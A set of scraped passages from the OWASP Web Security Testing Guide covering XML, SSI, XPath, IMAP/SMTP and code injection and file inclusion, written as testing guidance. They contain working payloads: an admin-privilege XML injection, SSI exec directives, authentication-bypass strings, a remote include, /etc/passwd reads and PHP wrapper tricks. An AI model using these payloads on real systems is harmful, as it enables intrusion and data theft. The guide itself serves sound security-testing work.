considering the previous application. By inserting the following values:\n\n```txt\nUsername: tony\nPassword: Un6R34kb!e\nE-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com\n```\n\nthe application will build a new node and append it to the XML database:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n    <user>\n        <username>tony</username>\n        <password>Un6R34kb!e</password>\n        <userid>500</userid>\n        <mail>s4tan@hell.com</mail>\n        <userid>0</userid>\n        <mail>s4tan@hell.com</mail>\n    </user>\n</users>\n```\n\nThe resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.\n\nThe only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it.\n\nLet's suppose that the XML document is specified by the following DTD:\n\n```xml\n<!DOCTYPE users [\n    <!ELEMENT users (user+) >\n    <!ELEMENT user (username,password,userid,mail+) >\n    <!ELEMENT username (#PCDATA) >\n    <!ELEMENT password (#PCDATA) >\n    <!ELEMENT userid (#PCDATA) >\n    <!ELEMENT mail (#PCDATA) >\n]>\n```\n\nNote that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.\n\nHowever, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:\n\n```txt\nUsername: tony\nPassword: Un6R34kb!e</password><!--\nE-mail: --><userid>0</userid><mail>s4tan@hell.com\n```\n\nIn this case, the final XML database is:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n    <user>\n        <username>tony</username>\n        <password>Un6R34kb!e</password><!--</password>\n        <userid>500</userid>\n        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>\n    </user>\n</users>\n```\n\nThe original `userid` node has been commented out, leaving only the injected one. The document now complies with its DTD rules.\n\n## Source Code Review\n\nThe following Java API may be vulnerable to XXE if they are not configured properly.\n\n```text\njavax.xml.parsers.DocumentBuilder\njavax.xml.parsers.DocumentBuildFactory\norg.xml.sax.EntityResolver\norg.dom4j.*\njavax.xml.parsers.SAXParser\njavax.xml.parsers.SAXParserFactory\nTransformerFactory\nSAXReader\nDocumentHelper\nSAXBuilder\nSAXParserFactory\nXMLReaderFactory\nXMLInputFactory\nSchemaFactory\nDocumentBuilderFactoryImpl\nSAXTransformerFactory\nDocumentBuilderFactoryImpl\nXMLReader\nXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser\n```\n\nCheck source code if the docType, external DTD, and external parameter entities are set as forbidden uses.\n\n- [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)\n\nIn addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.\n\nThe version of POI library can be identified from the filename of the JAR. For example,\n\n- `poi-3.8.jar`\n- `poi-ooxml-3.8.jar`\n\nThe followings source code keyword may apply to C.\n\n- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO\n- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader\n\n## Tools\n\n- [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)\n\n## References\n\n- [XML Injection](https://www.whitehatsec.com/glossary/content/xml-injection)\n- [Gregory Steuck, \"XXE (Xml eXternal Entity) attack\"](https://www.securityfocus.com/archive/1/297714)\n- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:52.752393"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md", "content": "# Testing for SSI Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-08|\n\n## Summary\n\nWeb servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with full-fledged server-side or client-side languages. This feature is provided by [Server-Side Includes](https://owasp.org/www-community/attacks/Server-Side_Includes_%28SSI%29_Injection)(SSI).\n\nServer-Side Includes are directives that the web server parses before serving the page to the user. They represent an alternative to writing CGI programs or embedding code using server-side scripting languages, when there's only need to perform very simple tasks. Common SSI implementations provide directives (commands) to include external files, to set and print web server CGI environment variables, or to execute external CGI scripts or system commands.\n\nSSI can lead to a Remote Command Execution (RCE), however most webservers have the `exec` directive disabled by default.\n\nThis is a vulnerability very similar to a classical scripting language injection vulnerability. One mitigation is that the web server needs to be configured to allow SSI. On the other hand, SSI injection vulnerabilities are often simpler to exploit, since SSI directives are easy to understand and, at the same time, quite powerful, e.g., they can output the content of files and execute system commands.\n\n## Test Objectives\n\n- Identify SSI injection points.\n- Assess the severity of the injection.\n\n## How to Test\n\nTo test for exploitable SSI, inject SSI directives as user input. If SSI are enabled and user input validation has not been properly implemented, the server will execute the directive. This is very similar to a classical scripting language injection vulnerability in that it occurs when user input is not properly validated and sanitized.\n\nFirst determine if the web server supports SSI directives. Often, the answer is yes, as SSI support is quite common. To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see [Fingerprint Web Server](../01-Information_Gathering/02-Fingerprint_Web_Server.md)). If you have access to the code, determine if SSI directives are used by searching through the webserver configuration files for specific keywords.\n\nAnother way of verifying that SSI directives are enabled is by checking for pages with the `.shtml` extension, which is associated with SSI directives. The use of the `.shtml` extension is not mandatory, so not having found any `.shtml` files doesn't necessarily mean that the target is not vulnerable to SSI injection attacks.\n\nThe next step is determining all the possible user input vectors and testing to see if the SSI injection is exploitable.\n\nFirst find all the pages where user input is allowed. Possible input vectors may also include headers and cookies. Determine how the input is stored and used, i.e if the input is returned as an error message or page element and if it was modified in some way. Access to the source code can help you to more easily determine where the input vectors are and how input is handled.\n\nOnce you have a list of potential injection points, you may determine if the input is correctly validated. Ensure it is possible to inject characters used in SSI directives such as `<!#=/.\"->` and `[a-zA-Z0-9]`\n\nThe below example returns the value of the variable. The [references](#references) section has helpful links with server-specific documentation to help you better assess a particular system.\n\n```html\n<!--#echo var=\"VAR\" -->\n```\n\nWhen using the `include` directive, if the supplied file is a CGI script, this directive will include the output of the CGI script. This directive may also be used to include the content of a file or list files in a directory:\n\n```html\n<!--#include virtual=\"FILENAME\" -->\n```\n\nTo return the output of a system command:\n\n```html\n<!--#exec cmd=\"OS_COMMAND\" -->\n```\n\nIf the application is vulnerable, the directive is injected and it would be interpreted by the server the next time the page is served.\n\nThe SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a dynamically generated page:\n\n```text\nGET / HTTP/1.1\nHost: www.example.com\nReferer: <!--#exec cmd=\"/bin/ps ax\"-->\nUser-Agent: <!--#include virtual=\"/proc/version\"-->\n```\n\n## Tools\n\n- [Web Proxy Burp Suite](https://portswigger.net/burp/communitydownload)\n- [ZAP](https://www.zaproxy.org/)\n- [String searcher: grep](https://www.gnu.org/software/grep)\n\n## References\n\n- [Nginx SSI module](https://nginx.org/en/docs/http/ngx_http_ssi_module.html)\n- [Apache: Module mod_include](https://httpd.apache.org/docs/current/mod/mod_include.html)\n- [IIS: Server-Side Includes directives](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525185%28v=vs.90%29)\n- [Apache Tutorial: Introduction to Server-Side Includes](https://httpd.apache.org/docs/current/howto/ssi.html)\n- [Apache: Security Tips for Server Configuration](https://httpd.apache.org/docs/current/misc/security_tips.html#ssi)\n- [SSI Injection instead of JavaScript Malware](https://jeremiahgrossman.blogspot.com/2006/08/ssi-injection-instead-of-javascript.html)\n- [IIS: Notes on Server-Side Includes (SSI) syntax](https://blogs.iis.net/robert_mcmurray/archive/2010/12/28/iis-notes-on-server-side-includes-ssi-syntax-kb-203064-revisited.aspx)\n- [Header Based Exploitation](https://www.cgisecurity.com/papers/header-based-exploitation.txt)\n", "timestamp": "2025-10-24T11:39:52.846518"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md", "content": "# Testing for XPath Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-09|\n\n## Summary\n\nXPath is a language that has been designed and developed primarily to address parts of an XML document. In XPath injection testing, we test if it is possible to inject XPath syntax into a request interpreted by the application, allowing an attacker to execute user-controlled XPath queries. When successfully exploited, this vulnerability may allow an attacker to bypass authentication mechanisms or access information without proper authorization.\n\nWeb applications heavily use databases to store and access the data they need for their operations. Historically, relational databases have been by far the most common technology for data storage, but, in the last years, we are witnessing an increasing popularity for databases that organize data using the XML language. Just like relational databases are accessed via SQL language, XML databases use XPath as their standard query language.\n\nSince, from a conceptual point of view, XPath is very similar to SQL in its purpose and applications, an interesting result is that XPath injection attacks follow the same logic as [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) attacks. In some aspects, XPath is even more powerful than standard SQL, as its whole power is already present in its specifications, whereas a large number of the techniques that can be used in a SQL Injection attack depend on the characteristics of the SQL dialect used by the target database. This means that XPath injection attacks can be much more adaptable and ubiquitous. Another advantage of an XPath injection attack is that, unlike SQL, no ACLs are enforced, as our query can access every part of the XML document.\n\n## Test Objectives\n\n- Identify XPATH injection points.\n\n## How to Test\n\nThe [XPath attack pattern was first published by Amit Klein](https://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf) and is very similar to the usual SQL Injection. In order to get a first grasp of the problem, let's imagine a login page that manages the authentication to an application in which the user must enter their username and password. Let's assume that our database is represented by the following XML file:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <account>admin</account>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <account>guest</account>\n    </user>\n    <user>\n        <username>tony</username>\n        <password>Un6R34kb!e</password>\n        <account>guest</account>\n    </user>\n</users>\n```\n\nAn XPath query that returns the account whose username is `gandalf` and the password is `!c3` would be the following:\n\n`string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())`\n\nIf the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:\n\n```text\nUsername: ' or '1' = '1\nPassword: ' or '1' = '1\n```\n\nLooks quite familiar, doesn't it? Using these parameters, the query becomes:\n\n`string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())`\n\nAs in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided. And as in a common SQL Injection attack, with XPath injection, the first step is to insert a single quote (`'`) in the field to be tested, introducing a syntax error in the query, and to check whether the application returns an error message.\n\nIf there is no knowledge about the XML data internal details and if the application does not provide useful error messages that help us reconstruct its internal logic, it is possible to perform a [Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection) attack, whose goal is to reconstruct the whole data structure. The technique is similar to inference based SQL Injection, as the approach is to inject code that creates a query that returns one bit of information. [Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection) is explained in more detail by Amit Klein in the referenced paper.\n\n## References\n\n### Whitepapers\n\n- [Amit Klein: \"Blind XPath Injection\"](https://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf)\n- [XPath 1.0 specifications](https://www.w3.org/TR/1999/REC-xpath-19991116/)\n", "timestamp": "2025-10-24T11:39:52.979232"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md", "content": "# Testing for IMAP SMTP Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-10|\n\n## Summary\n\nThis threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.\n\nThe IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.\n\nAn IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the front-end web servers. Therefore, mail server results may be more vulnerable to attacks by end users (see the scheme presented in Figure 1).\n\n![IMAP SMTP Injection](images/Imap-smtp-injection.png)\\\n*Figure 4.7.10-1: Communication with the mail servers using the IMAP/SMTP Injection technique*\n\nFigure 1 depicts the flow of traffic generally seen when using webmail technologies. Step 1 and 2 is the user interacting with the webmail client, whereas step 2 is the tester bypassing the webmail client and interacting with the back-end mail servers directly.\n\nThis technique allows a wide variety of actions and attacks. The possibilities depend on the type and scope of injection and the mail server technology being tested.\n\nSome examples of attacks using the IMAP/SMTP Injection technique are:\n\n- Exploitation of vulnerabilities in the IMAP/SMTP protocol\n- Application restrictions evasion\n- Anti-automation process evasion\n- Information leaks\n- Relay/SPAM\n\n## Test Objectives\n\n- Identify IMAP/SMTP injection points.\n- Understand the data flow and deployment structure of the system.\n- Assess the injection impacts.\n\n## How to Test\n\n### Identifying Vulnerable Parameters\n\nIn order to detect vulnerable parameters, the tester has to analyze the application's ability in handling input. Input validation testing requires the tester to send bogus, or malicious, requests to the server and analyse the response. In a secure application, the response should be an error with some corresponding action telling the client that something has gone wrong. In a vulnerable application, the malicious request may be processed by the back-end application that will answer with a `HTTP 200 OK` response message.\n\nIt is important to note that the requests being sent should match the technology being tested. Sending SQL injection strings for Microsoft SQL server when a MySQL server is being used will result in false positive responses. In this case, sending malicious IMAP commands is modus operandi since IMAP is the underlying protocol being tested.\n\nIMAP special parameters that should be used are:\n\n| On the IMAP server     | On the SMTP server |\n|------------------------|--------------------|\n| Authentication         | Emissor email     |\n| operations with mail boxes (list, read, create, delete, rename) | Destination email |\n| operations with messages (read, copy, move, delete) | Subject   |\n| Disconnection          | Message body       |\n|                        | Attached files     |\n\nIn this example, the \"mailbox\" parameter is being tested by manipulating all requests with the parameter in:\n\n`https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1`\n\nThe following examples can be used.\n\n- Assign a null value to the parameter:\n\n`https://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1`\n\n- Substitute the value with a random value:\n\n`https://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1`\n\n- Add other values to the parameter:\n\n`https://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1`\n\n- Add non-standard special characters (i.e.: `\\`, `'`, `\"`, `@`, `#`, `!`, `|`):\n\n`https://<webmail>/src/read_body.php?mailbox=INBOX\"&passed_id=46106&startMessage=1`\n\n- Eliminate the parameter:\n\n`https://<webmail>/src/read_body.php?passed_id=46106&startMessage=1`\n\nThe final result of the above testing gives the tester three possible situations:\nS1 - The application returns a error code/message\nS2 - The application does not return an error code/message, but it does not realize the requested operation\nS3 - The application does not return an error code/message and realizes the operation requested normally\n\nSituations S1 and S2 represent successful IMAP/SMTP injection.\n\nAn attacker's aim is receiving the S1 response, as it is an indicator that the application is vulnerable to injection and further manipulation.\n\nLet's suppose that a user retrieves the email headers using the following HTTP request:\n\n`https://<webmail>/src/view_header.php?mailbox=INBOX&passed_id=46105&passed_ent_id=0`\n\nAn attacker might modify the value of the parameter INBOX by injecting the character `\"` (%22 using URL encoding):\n\n`https://<webmail>/src/view_header.php?mailbox=INBOX%22&passed_id=46105&passed_ent_id=0`\n\nIn this case, the application answer may be:\n\n```txt\nERROR: Bad or malformed request.\nQuery: SELECT \"INBOX\"\"\nServer responded: Unexpected extra arguments to Select\n```\n\nThe situation S2 is harder to test successfully. The tester needs to use blind command injection in order to determine if the server is vulnerable.\n\nOn the other hand, the last situation (S3) is not relevant in this paragraph.\n\n> List of vulnerable parameters\n>\n> - Affected functionality\n> - Type of possible injection (IMAP/SMTP)\n\n### Understanding the Data Flow and Deployment Structure of the Client\n\nAfter identifying all vulnerable parameters (for example, `passed_id`), the tester needs to determine what level of injection is possible and then design a testing plan to further exploit the application.\n\nIn this test case, we have detected that the application's `passed_id` parameter is vulnerable and is used in the following request:\n\n`https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46225&startMessage=1`\n\nUsing the following test case (providing an alphabetical value when a numerical value is required):\n\n`https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=test&startMessage=1`\n\nwill generate the following error message:\n\n```txt\nERROR : Bad or malformed request.\nQuery: FETCH test:test BODY[HEADER]\nServer responded: Error in IMAP command received by server.\n```\n\nIn this example, the error message returned the name of the executed command and the corresponding parameters.\n\nIn other situations, the error message (`not controlled` by the application) contains the name of the executed command, but reading the suitable [RFC](#references) allows the tester to understand what other possible commands can be executed.\n\nIf the application does not return descriptive error messages, the tester needs to analyze the affected functionality to deduce all the possible commands (and parameters) associated with the above mentioned functionality. For example, if a vulnerable parameter has been detected in the create mailbox functionality, it is logical to assume that the affected IMAP command is `CREATE`. According to the RFC, the `CREATE` command accepts one parameter which specifies the name of the mailbox to create.\n\n> List of IMAP/SMTP commands affected\n>\n> - Type, value, and number of parameters expected by the affected IMAP/SMTP commands\n\n### IMAP/SMTP Command Injection\n\nOnce the tester has identified vulnerable parameters and has analyzed the context in which they are executed, the next stage is exploiting the functionality.\n\nThis stage has two possible outcomes:\n\n1. The injection is possible in an unauthenticated state: the affected functionality does not require the user to be authenticated. The injected (IMAP) commands available are limited to: `CAPABILITY`, `NOOP`, `AUTHENTICATE`, `LOGIN`, and `LOGOUT`.\n2. The injection is only possible in an authenticated state: the successful exploitation requires the user to be fully authenticated before testing can continue.\n\nIn any case, the typical structure of an IMAP/SMTP Injection is as follows:\n\n- Header: ending of the expected command;\n- Body: injection of the new command;\n- Footer: beginning of the expected command.\n\nIt is important to remember that, in order to execute an IMAP/SMTP command, the previous command must be terminated with the CRLF (`%0d%0a`) sequence.\n\nLet's suppose that in the [Identifying vulnerable parameters](#identifying-vulnerable-parameters) stage, the attacker detects that the parameter `message_id` in the following request is vulnerable:\n\n`https://<webmail>/read_email.php?message_id=4791`\n\nLet's suppose also that the outcome of the analysis performed in the stage 2 (\"Understanding the data flow and deployment structure of the client\") has identified the command and arguments associated with this parameter as:\n\n`FETCH 4791 BODY[HEADER]`\n\nIn this scenario, the IMAP injection structure would be:\n\n`https://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791`\n\nWhich would generate the following commands:\n\n```sql\n???? FETCH 4791 BODY[HEADER]\nV100 CAPABILITY\nV101 FETCH 4791 BODY[HEADER]\n```\n\nwhere:\n\n```sql\nHeader = 4791 BODY[HEADER]\nBody   = %0d%0aV100 CAPABILITY%0d%0a\nFooter = V101 FETCH 4791\n```\n\n> List of IMAP/SMTP commands affected\n>\n> - Arbitrary IMAP/SMTP command injection\n\n## References\n\n### Whitepapers\n\n- [RFC 0821 \"Simple Mail Transfer Protocol\"](https://tools.ietf.org/html/rfc821)\n- [RFC 3501 \"Internet Message Access Protocol - Version 4rev1\"](https://tools.ietf.org/html/rfc3501)\n", "timestamp": "2025-10-24T11:39:53.211474"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.md", "content": "# Testing for Code Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-11|\n\n## Summary\n\nThis section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.\n\nIn [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.\n\n## Test Objectives\n\n- Identify injection points where you can inject code into the application.\n- Assess the injection severity.\n\n## How to Test\n\n### Black-Box Testing\n\n#### Testing for PHP Injection Vulnerabilities\n\nUsing the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:\n\n`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`\n\n> The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.\n\n### Gray-Box Testing\n\n#### Testing for ASP Code Injection Vulnerabilities\n\nExamine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:\n\n```asp\n<%\nIf not isEmpty(Request( \"Data\" ) ) Then\nDim fso, f\n'User input Data is written to a file named data.txt\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.OpenTextFile(Server.MapPath( \"data.txt\" ), 8, True)\nf.Write Request(\"Data\") & vbCrLf\nf.close\nSet f = nothing\nSet fso = Nothing\n\n'Data.txt is executed\nServer.Execute( \"data.txt\" )\n\nElse\n%>\n\n<form>\n<input name=\"Data\" /><input type=\"submit\" name=\"Enter Data\" />\n\n</form>\n<%\nEnd If\n%>)))\n```\n\n### References\n\n- [Insecure.org](https://insecure.org/)\n- [Wikipedia](https://www.wikipedia.org)\n- [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)\n", "timestamp": "2025-10-24T11:39:53.317190"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md", "content": "# Testing for File Inclusion\n\n## Summary\n\nThe File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanism implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.\n\nThis can lead to something as simple as outputting the contents of the file, but it can also lead to:\n\n- Code execution on the web server\n- Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)\n- Denial of Service (DoS)\n- Sensitive Information Disclosure\n\nLocal File Inclusion (LFI) is the process of including files that are already present on the server through exploitation of vulnerable inclusion procedures implemented in the application. For example, this vulnerability occurs when a page receives input that is a path to a local file. This input is not properly sanitized, allowing directory traversal characters to be injected (such as `../` -- see 4.5.1 [Testing Directory Traversal File Include](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)).\n\nRemote File Inclusion (RFI) is the process of including files from remote sources through exploitation of vulnerable inclusion procedures implemented in the application. For example, this vulnerability occurs when a page receives input that is the URL to a remote file. This input is not properly sanitized, allowing external URLs to be injected.\n\nIn both cases, although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP, etc.\n\n## Test Objectives\n\n- Identify file inclusion points.\n- Assess the severity or potential impact of the vulnerabilities.\n\n## How to Test\n\n### Testing for Local File Inclusion\n\nSince LFI occurs when paths passed to `include` statements are not properly sanitized, in a black-box testing approach, we should look for functionality that accepts file names/paths as parameters.\n\nConsider the following example:\n\n`https://vulnerable_host/preview.php?file=example.html`\n\nThis looks to be a promising place to try LFI. If the application does not select the appropriate page given in the `file` parameter and instead directly includes the input, it is possible to include arbitrary files from the server.\n\nA typical proof-of-concept exploit would be to attempt to load the `passwd` file with:\n\n`https://vulnerable_host/preview.php?file=../../../../etc/passwd`\n\nIf the above mentioned conditions are met, an attacker would see something like the following included in the response:\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nalex:x:500:500:alex:/home/alex:/bin/bash\nmargo:x:501:501::/home/margo:/bin/bash\n...\n```\n\nEven when such a vulnerability exists, its exploitation could be more complex in real life scenarios. Consider the following piece of code:\n\n```php\n<?php include($_GET['file'].\".php\"); ?>\n```\n\nSimple substitution with a random filename would not work as the postfix `.php` is appended to the provided input. In order to bypass it, a tester can use several techniques to get the expected exploitation.\n\n#### Null Byte Injection\n\nThe `null character` (also known as `null terminator` or `null byte`) is a control character with the value zero present in many character sets that is being used as a reserved character to mark the end of a string. Once used, any character after this special byte will be ignored. Commonly the way to inject this character would be with the URL encoded string `%00` by appending it to the requested path. In our previous sample, performing a request to `https://vulnerable_host/preview.php?file=../../../../etc/passwd%00` would ignore the `.php` extension being added to the input filename, returning to an attacker a list of basic users as a result of a successful exploitation.\n\n#### Path and Dot Truncation\n\nMost PHP installations have a filename limit of 4096 bytes. If any given filename is longer than that length, PHP simply truncates it, discarding any additional characters. Abusing this behavior makes it possible to make the PHP engine ignore the `.php` extension by moving it out of the 4096 bytes limit. When this happens, no error is triggered; the additional characters are simply dropped and PHP continues its execution normally.\n\nThis bypass would commonly be combined with other logic bypass strategies such as encoding part of the file path with Unicode encoding, the introduction of double encoding, or any other input that would still represent the valid desired filename.\n\n#### PHP Wrappers\n\nLocal File Inclusion vulnerabilities are commonly seen as read only vulnerabilities that an attacker can use to read sensitive data from the server hosting the vulnerable application. However, in some specific implementations this vulnerability can be used to upgrade the attack [from LFI to Remote Code Execution](https://www.corben.io/zip-to-rce-lfi/) vulnerabilities that could potentially fully compromise the host.\n\nThis enhancement is common when an attacker could be able to combine the [LFI vulnerability with certain PHP wrappers](https://www.netsparker.com/blog/web-security/php-stream-wrappers/).\n\nA wrapper is a code that surrounds other code to perform some added functionality. PHP implements many [built-in wrappers](https://www.php.net/manual/en/wrappers.php) to be used with file system functions. Once their usage is detected during the testing process of an application, it's a good practice to try to abuse it to identify the real risk of the detected weakness(es). Below is a list with the most commonly used wrappers, even though you should consider that it is not exhaustive and at the same time it is possible to register custom wrappers that if employed by the target, would require a deeper adhoc analysis.\n\n##### PHP Filter\n\nUsed to access the local file system; this is a case insensitive wrapper that provides the capability to apply filters to a stream at the time of opening a file. This wrapper can be used to get content of a file preventing the server from executing it. For example, allowing an attacker to read the content of PHP files to get source code to identify sensitive information such as credentials or other exploitable vulnerabilities.\n\nThe wrapper can be used like `php://filter/convert.base64-encode/resource=FILE` where `FILE` is the file to retrieve. As a result of the usage of this execution, the content of the target file would be read, encoded to base64 (this is the step that prevents the execution server-side), and returned to the User-Agent.\n\n##### PHP ZIP\n\nIn PHP 7.2.0, the `zip://` wrapper was introduced to manipulate `zip` compressed files. This wrapper expects the following parameter structure: `zip:///filename_path#internal_filename`. The `filename_path` is the path to the malicious ZIP archive and `internal_filename` is the path of the malicious file placed inside the processed ZIP file. During the exploitation, it's common that the `#` would be encoded with its URL encoded value `%23`.\n\nAbuse of this wrapper could allow an attacker to design a malicious ZIP file that could be uploaded to the server, for example as an avatar image or using any file upload system available on the target site (the `php:zip://` wrapper does not require the ZIP file to have any specific extension) to be executed by the LFI vulnerability.\n\nIn order to test this vulnerability, the following procedure could be followed to attack the previous code example provided.\n\n1. Create the PHP file to be executed, for example with the content `<?php phpinfo(); ?>` and save it as `code.php`.\n2. Compress it as a new ZIP file called `target.zip`.\n3. Rename the `target.zip` file to `target.jpg` to bypass the extension validation and upload it to the target website as your avatar image.\n4. Supposing that the `target.jpg` file is stored locally on the server to the `../avatar/target.jpg` path, exploit the vulnerability with the PHP ZIP wrapper by injecting the following payload to the vulnerable URL: `zip://../avatar/target.jpg%23code` (remember that `%23` corresponds to `#`).\n\nSince on our sample the `.php` extension is concatenated to our payload, the request to `https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` will result in the execution of the `code.php` file existing in the malicious ZIP file.\n\n##### PHP Data\n\nAvailable since PHP 5.2.0, this wrapper expects the following usage: `data://text/plain;base64,BASE64_STR` where `BASE64_STR` is expected to be the base64 encoded content of the file to be processed. It's important to consider that this wrapper would only be available if the option `allow_url_include` would be enabled.\n\nIn order to test for LFI using this wrapper, the code to be executed should be base64 encoded. For example, `<?php phpinfo(); ?>` would be encoded as: `PD9waHAgcGhwaW5mbygpOyA/Pg==` and the payload would be represented as: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.\n\n##### PHP Expect\n\nThis wrapper, which is not enabled by default, provides access to processes `stdio`, `stdout`, and `stderr`. Given in the format `expect://command`, the server would execute the provided command using `BASH` and return the result.\n\n### Testing for Remote File Inclusion\n\nSince RFI occurs when URLs passed to `include` statements are not properly sanitized, in a black-box testing approach, we should look for scripts that take filenames as parameters. Consider the following PHP example:\n\n```php\n$incfile = $_REQUEST[\"file\"];\ninclude($incfile.\".php\");\n```\n\nIn this example the path is extracted from the HTTP request and no input validation is done (for 